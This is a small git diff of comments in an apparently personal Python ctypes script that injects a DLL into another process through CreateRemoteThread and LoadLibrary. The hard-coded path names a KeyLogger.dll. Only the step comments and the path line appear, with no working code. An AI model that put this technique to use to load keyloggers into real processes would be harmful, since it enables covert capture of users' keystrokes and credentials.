@@ -17,8 +17,8 @@ PAGE_READWRITE = 0x04 #Since we arent executing shellcode, this only needs to be
 ### 2 - Get a handle to the process
 ### 3 - With the handle, create a space in the memory for the malicious DLL
 ### 4 - Write the dll into the process memory
-### 5 - Since LoadLibraryA isnt callable by default with Ctypes, we need its handle
-### 6 - Call the new dll using load library
+### 5 - Because we need to call load library within createremotethread, we need its handle.
+### 6 - Call the new dll using CreateRemoteThread,with arguments for LoadLibrary and our created memory
 
 ### Define the path to the DLL (keeping this static cause im lazy)
 dll_path = dll_path = "C:\\Users\\Sam\\source\\repos\\KeyLogger\\Release\\KeyLogger.dll"
